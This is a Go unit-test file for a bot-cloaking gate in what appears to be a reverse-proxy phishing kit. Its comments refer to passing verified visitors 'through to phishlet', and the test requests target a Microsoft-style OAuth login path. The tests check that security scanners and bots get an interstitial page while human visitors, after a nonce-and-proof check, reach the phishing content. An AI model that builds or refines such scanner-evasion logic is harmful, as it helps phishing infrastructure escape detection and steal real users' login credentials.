package core

import (
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"
)

// TestGateBlocksBotNoInteraction: a plain GET without a human token gets the
// interstitial (not the phishlet).
func TestGateBlocksBotNoInteraction(t *testing.T) {
	InitCloak(nil)
	c := GetCloak()
	ip := "192.0.2.10"

	req := httptest.NewRequest("GET", "https://login.example.com/common/oauth2/authorize", nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120")
	req.Header.Set("Accept-Language", "en-US")

	resp := c.GateCheck(ip, req)
	if resp == nil {
		t.Fatal("gate should block a first-time visitor without a token")
	}
	if resp.StatusCode != http.StatusOK {
		t.Errorf("gate page status = %d, want 200", resp.StatusCode)
	}
	// must contain the gate page, not phishlet content
	body := readBody(t, resp)
	if !strings.Contains(body, "__gate/verify") {
		t.Error("gate page should reference the verify endpoint")
	}
}

// TestGateBotFailsVerifyWithoutProof: bot POSTs verify directly without a
// trusted-interaction proof -> gets re-gated, no token issued.
func TestGateBotFailsVerifyWithoutProof(t *testing.T) {
	InitCloak(nil)
	c := GetCloak()
	ip := "192.0.2.11"

	// step 1: get gate page + nonce
	req := httptest.NewRequest("GET", "https://login.example.com/x", nil)
	resp := c.GateCheck(ip, req)
	nonce := extractNonce(t, readBody(t, resp))

	// step 2: bot POSTs verify with valid nonce but NO proof (p missing)
	form := url.Values{"n": {nonce}}
	vreq := httptest.NewRequest("POST", "https://login.example.com/__gate/verify", strings.NewReader(form.Encode()))
	vreq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	vresp := c.GateCheck(ip, vreq)
	if vresp == nil {
		t.Fatal("verify without proof must not pass the gate")
	}
	body := readBody(t, vresp)
	if strings.Contains(body, humanCookieName) {
		t.Error("no human token cookie may be issued without trusted-interaction proof")
	}

	// and a follow-up request must still be gated (no valid token)
	req2 := httptest.NewRequest("GET", "https://login.example.com/x", nil)
	if resp2 := c.GateCheck(ip, req2); resp2 == nil {
		t.Error("visitor must still be gated after failed proof")
	}
}

// TestGateBotFailsVerifyWithForgedProof: bot sends p=1 directly — but it first
// needs the nonce; we simulate it skipping the page and guessing: no nonce.
func TestGateBotFailsVerifyWithForgedProof(t *testing.T) {
	InitCloak(nil)
	c := GetCloak()
	ip := "192.0.2.12"

	form := url.Values{"n": {"forgednonce"}, "p": {"1"}}
	vreq := httptest.NewRequest("POST", "https://login.example.com/__gate/verify", strings.NewReader(form.Encode()))
	vreq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	vresp := c.GateCheck(ip, vreq)
	if vresp == nil {
		t.Fatal("forged nonce must not pass")
	}
	if strings.Contains(readBody(t, vresp), humanCookieName) {
		t.Error("no token cookie for forged nonce")
	}
}

// TestGateHumanPasses: legitimate flow — gate page, then verify with nonce+proof,
// then token cookie + subsequent pass-through.
func TestGateHumanPasses(t *testing.T) {
	InitCloak(nil)
	c := GetCloak()
	ip := "192.0.2.13"

	req := httptest.NewRequest("GET", "https://login.example.com/oauth2/authorize?client_id=x", nil)
	resp := c.GateCheck(ip, req)
	nonce := extractNonce(t, readBody(t, resp))

	form := url.Values{"n": {nonce}, "p": {"1"}}
	vreq := httptest.NewRequest("POST", "https://login.example.com/__gate/verify", strings.NewReader(form.Encode()))
	vreq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	vresp := c.GateCheck(ip, vreq)
	if vresp == nil {
		t.Fatal("valid nonce + proof must pass the gate")
	}
	vbody := readBody(t, vresp)
	if !strings.Contains(vbody, humanCookieName) {
		t.Error("human token cookie must be issued after verification")
	}

	// extract token from Set-Cookie
	var token string
	for _, ck := range vresp.Header.Values("Set-Cookie") {
		if strings.HasPrefix(ck, humanCookieName+"=") {
			token = strings.Split(strings.Split(ck, ";")[0], "=")[1]
		}
	}
	if token == "" {
		t.Fatal("no token cookie found")
	}

	// nonce must be single-use: replay must fail
	form2 := url.Values{"n": {nonce}, "p": {"1"}}
	rreq := httptest.NewRequest("POST", "https://login.example.com/__gate/verify", strings.NewReader(form2.Encode()))
	rreq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if rresp := c.GateCheck(ip, rreq); rresp == nil {
		t.Error("nonce replay must be rejected")
	}

	// subsequent request with token cookie -> pass
	req2 := httptest.NewRequest("GET", "https://login.example.com/oauth2/authorize?client_id=x", nil)
	req2.AddCookie(&http.Cookie{Name: humanCookieName, Value: token})
	if resp2 := c.GateCheck(ip, req2); resp2 != nil {
		t.Error("request with valid human token must pass through to phishlet")
	}
}

// TestGateNonceExpiry: expired nonce is rejected.
func TestGateNonceExpiry(t *testing.T) {
	InitCloak(nil)
	c := GetCloak()
	ip := "192.0.2.14"

	req := httptest.NewRequest("GET", "https://login.example.com/x", nil)
	resp := c.GateCheck(ip, req)
	nonce := extractNonce(t, readBody(t, resp))

	// force-expire the nonce
	c.mu.Lock()
	if prof, ok := c.profiles[ip]; ok {
		prof.PendingNonceUntil = prof.PendingNonceUntil.Add(-10 * 60 * time.Second)
	}
	c.mu.Unlock()

	form := url.Values{"n": {nonce}, "p": {"1"}}
	vreq := httptest.NewRequest("POST", "https://login.example.com/__gate/verify", strings.NewReader(form.Encode()))
	vreq.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if vresp := c.GateCheck(ip, vreq); vresp == nil {
		t.Error("expired nonce must be rejected")
	}
}

func readBody(t *testing.T, resp *http.Response) string {
	t.Helper()
	if resp.Body == nil {
		return ""
	}
	buf := make([]byte, 65536)
	n, _ := resp.Body.Read(buf)
	return string(buf[:n])
}

func extractNonce(t *testing.T, page string) string {
	t.Helper()
	i := strings.Index(page, `name="n" value="`)
	if i < 0 {
		i = strings.Index(page, `var NONCE = "`)
		if i < 0 {
			t.Fatal("nonce not found in gate page")
		}
		rest := page[i+len(`var NONCE = "`):]
		j := strings.Index(rest, `"`)
		return rest[:j]
	}
	rest := page[i+len(`name="n" value="`):]
	j := strings.Index(rest, `"`)
	return rest[:j]
}
